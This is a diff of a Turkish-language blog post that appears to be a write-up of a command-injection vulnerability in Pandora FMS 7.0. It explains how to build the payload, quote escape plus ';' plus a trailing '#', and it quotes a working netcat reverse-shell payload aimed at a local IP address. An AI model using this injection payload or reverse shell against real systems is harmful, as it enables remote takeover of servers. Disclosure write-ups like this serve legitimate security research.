@@ -117,7 +117,7 @@ Fonksiyon tanımlarına tekrar döndüm, netflow_get_filter_arguments fonksiyonu
 <p><img alt="PANDORAFMS 7.0" src="/images/pandorafms/pandorafms-son-dokunuslar.png"></p>
 Çift tırnakları kapatmak için payloadımız " karakteriyle başlamalı ve kendi komutumuzu çalıştırmak adına " karakterini bir ; takip etmeli tabi farklı girdilerde kullanılabilir && gibi.
 Son olarak, payloadımızdan sonra gelecek eklemelerin payloadı bozmaması için en sona # işareti koymamız yeterli olacaktır. Yani payloadımız ";Girilecek Komut# taslağında olacak.
-Taslağın arasına ufak bir reverseshell komutu iliştirmek için <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Pentestmonkey</a>den bir reverseshell komutu aşırdım.
+Taslağın arasına ufak bir reverseshell komutu iliştirmek için <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Pentestmonkey</a> den bir reverseshell komutu aşırdım.
 Ve sonuç payloadı: <strong>";nc -e /bin/sh 192.168.1.100 1234 #</strong> olarak oluştu.
 Ve sayfada bulunan "router ip" harici herhangi bir inputa oluşturduğum payloadı verdiğimde, mutlu son...
 </p>
